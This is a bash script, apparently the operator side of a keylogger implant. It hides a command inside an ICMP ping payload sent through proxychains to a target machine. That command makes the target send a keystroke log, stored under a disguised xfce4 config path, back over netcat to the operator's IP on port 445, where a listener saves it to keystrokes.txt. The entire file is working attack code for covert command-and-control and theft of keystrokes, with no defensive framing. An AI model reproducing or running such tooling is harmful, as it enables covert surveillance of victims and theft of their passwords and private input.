#!/usr/bin/env bash

. /home/${USER}/Documents/scripts/linux/lib-cecho.sh

if [ $# -ne 1 ]; then
	cecho warning "Usage: $(basename $0) <ip_address>"
	exit 1
fi


LOCAL_IP=$(ip address show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
LOCAL_PORT=445

REMOTE_KEYSTROKES_FILE="/usr/lib/x86_64-linux-gnu/xfce4/volumed/xfce4-volume.conf"
LOCAL_KEYSTROKES_FILE="keystrokes.txt"

REMOTE_IP="$1"
COMMAND="which nc &>/dev/null && nc -w1 -vn ${LOCAL_IP} ${LOCAL_PORT} < ${REMOTE_KEYSTROKES_FILE}"


cecho debug "Command is: ${COMMAND}"
cecho task "Requesting keystrokes file"

# Send 'COMMAND<command>COMMAND' to target to execute command
(sleep 1 && proxychains -q sudo nping --icmp -c 1 --data-string "COMMAND${COMMAND}COMMAND" ${REMOTE_IP} 2>/dev/null 1>&2) &

nc -q3 -lvvnp $LOCAL_PORT > ${LOCAL_KEYSTROKES_FILE}

[ $? -eq 0 ] && cecho done "Saved keystrokes to '${LOCAL_KEYSTROKES_FILE}'" || cecho warning "Didn't receive keystrokes from ${REMOTE_IP}"
